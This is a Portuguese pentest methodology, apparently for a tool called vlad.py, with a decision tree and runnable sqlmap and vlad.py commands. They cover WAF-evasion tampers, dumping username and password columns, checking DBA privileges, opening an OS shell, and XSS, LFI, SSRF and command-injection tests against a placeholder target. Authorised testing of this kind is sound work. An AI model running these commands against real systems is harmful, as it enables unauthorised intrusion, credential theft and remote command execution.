# Metodologia de Pentest — Vlad Volkov

## Árvore de Decisão

```
INÍCIO
  │
  ▼
[1. RECONHECIMENTO]
  ├─ Descobrir parâmetros GET/POST/Cookie
  ├─ Detectar WAF → skills/00_reconhecimento/deteccao_waf.md
  ├─ Identificar DBMS → skills/00_reconhecimento/fingerprint_dbms.md
  └─ Mapear superfície de ataque
  │
  ▼
[2. SELEÇÃO DE TÉCNICA]
  ├─ python vlad.py tecnica
  │   ├─ Erros SQL visíveis? → Error-based (E) — mais rápido
  │   ├─ Dados refletidos? → UNION-based (U) — mais rápido
  │   ├─ Diferença TRUE/FALSE? → Boolean-blind (B)
  │   ├─ DBMS suporta stacked? → Stacked Queries (S)
  │   └─ Sem output algum? → Time-blind (T) — último recurso
  │
  ▼
[3. SELEÇÃO DE TAMPERS] (se WAF detectado)
  ├─ python vlad.py tamper --waf <WAF> --dbms <DBMS>
  │   ├─ Cloudflare → space2comment,randomcase,charencode
  │   ├─ ModSecurity → modsecurityzeroversioned,space2comment
  │   ├─ Imperva → space2comment,between,greatest,charencode
  │   └─ Outros → ver MAPA_WAF_TAMPER em seletor_tamper.py
  │
  ▼
[4. SCAN SQLi]
  ├─ python vlad.py scan --alvo URL --modo padrao
  │   ├─ Injetável encontrado? → ir para EXPLORAÇÃO
  │   ├─ Não detectado? → aumentar --nivel=3 --technique=BEUST
  │   └─ WAF bloqueando? → adicionar tampers, --delay=2
  │
  ▼
[5. EXPLORAÇÃO]
  ├─ Enumerar BD → --dbs --tables --columns
  ├─ Extrair dados → --dump -C "username,password"
  ├─ Verificar privilégios → --is-dba --privileges
  ├─ Shell OS? → --os-shell (se DBA + permissões)
  └─ Leitura/escrita arquivo? → --file-read --file-write
  │
  ▼
[6. TESTES WEB ADICIONAIS]
  ├─ python vlad.py web --alvo URL --tipo xss lfi ssrf cmd traversal
  │   ├─ XSS → skills/04_web_attacks/xss_refletido.md
  │   ├─ LFI → skills/04_web_attacks/lfi_rfi.md
  │   ├─ SSRF → skills/04_web_attacks/ssrf.md
  │   ├─ CMD → skills/04_web_attacks/injecao_comando.md
  │   └─ Traversal → skills/04_web_attacks/traversal_diretorio.md
  │
  ▼
[7. RELATÓRIO]
  └─ python vlad.py relatorio --sessao ultima
```

---

## Fase 1: Reconhecimento

### 1.1 Mapear Superfície de Ataque
```bash
# Crawl automático
sqlmap -u "http://alvo.com/" --crawl=3 --forms --batch

# Ou com vlad.py auto
python vlad.py auto --alvo "http://alvo.com/"
```

### 1.2 Detectar WAF
```bash
python vlad.py waf --alvo "http://alvo.com" --probe
```

### 1.3 Identificar DBMS
```bash
# Via erro, cabeçalhos, ou tecnologia web
# Ver: skills/00_reconhecimento/fingerprint_dbms.md
```

---

## Fase 2: Detecção de SQLi

### 2.1 Scan Rápido (triagem)
```bash
python vlad.py scan --alvo "http://alvo.com/?id=1" --modo rapido
```

### 2.2 Se não detectado: Scan Padrão
```bash
python vlad.py scan --alvo "http://alvo.com/?id=1" --modo padrao
```

### 2.3 Se WAF bloqueando: Adicionar Tampers
```bash
python vlad.py tamper --waf cloudflare --dbms mysql --alvo "http://alvo.com/?id=1"
python vlad.py scan --alvo "http://alvo.com/?id=1" --tamper "space2comment,randomcase,charencode"
```

### 2.4 Último recurso: Scan Profundo + Todos os Tampers
```bash
python vlad.py scan --alvo "http://alvo.com/?id=1" \
  --modo profundo \
  --waf cloudflare \
  --nivel 5 --risco 2 \
  --delay 2 --threads 1
```

---

## Fase 3: Exploração

### 3.1 Enumeração do Banco
```bash
# Sequência recomendada
sqlmap -u "http://alvo.com/?id=1" --banner --current-user --current-db --is-dba --batch
sqlmap -u "http://alvo.com/?id=1" --dbs --batch
sqlmap -u "http://alvo.com/?id=1" -D app --tables --batch
sqlmap -u "http://alvo.com/?id=1" -D app -T users --columns --batch
sqlmap -u "http://alvo.com/?id=1" -D app -T users -C "username,password" --dump --batch
```

### 3.2 Verificar Escalação
```bash
sqlmap -u "http://alvo.com/?id=1" --privileges --batch
```

### 3.3 Shell OS (se DBA)
```bash
sqlmap -u "http://alvo.com/?id=1" --os-shell --batch
```

---

## Fase 4: Testes Web Complementares

```bash
# XSS nos parâmetros
python vlad.py web --alvo "http://alvo.com/?search=teste" --tipo xss

# LFI em parâmetros de arquivo/página
python vlad.py web --alvo "http://alvo.com/?page=home" --tipo lfi

# SSRF em parâmetros de URL
python vlad.py web --alvo "http://alvo.com/?url=http://site.com" --tipo ssrf

# Todos os testes
python vlad.py web --alvo "http://alvo.com/?id=1" --tipo xss lfi ssrf cmd traversal
```

---

## Matriz de Decisão: Técnica × DBMS

| DBMS | Técnica Preferida | Segunda Opção | Notas |
|------|------------------|---------------|-------|
| MySQL | U ou E | B | SLEEP(), comentários versão |
| MSSQL | E ou S | U | xp_cmdshell, WAITFOR |
| PostgreSQL | U ou E | S | Stacked nativo |
| Oracle | E ou U | B | Sem stacked, dual obrigatório |
| SQLite | U ou B | T | randomblob() para time-based |

---

## Checklist de Pentest SQLi

```
[ ] Identificar todos os parâmetros de entrada
[ ] Detectar WAF (se houver)
[ ] Identificar DBMS (se possível)
[ ] Selecionar técnica adequada
[ ] Selecionar tampers (se WAF)
[ ] Confirmar injetabilidade
[ ] Enumerar banco de dados
[ ] Identificar tabelas sensíveis
[ ] Extrair credenciais (mínimo para demonstrar impacto)
[ ] Verificar privilégios (é DBA?)
[ ] Testar escalação (OS shell, file read/write)
[ ] Executar testes web complementares
[ ] Gerar relatório
[ ] Remover artefatos (webshells, usuários criados)
[ ] Entregar relatório ao cliente
```

---

## Níveis de Severidade

| Severidade | Critério |
|-----------|---------|
| **CRÍTICO** | SQLi com extração de dados + credenciais, RCE, DBA |
| **ALTO** | SQLi confirmado sem dados, XSS sem HttpOnly, LFI |
| **MÉDIO** | Fingerprint do BD, SSRF limitado, Traversal sem arquivo sensível |
| **BAIXO** | Erros de SQL visíveis, informações de versão expostas |
| **INFO** | Tecnologia web exposta, cabeçalhos de segurança ausentes |
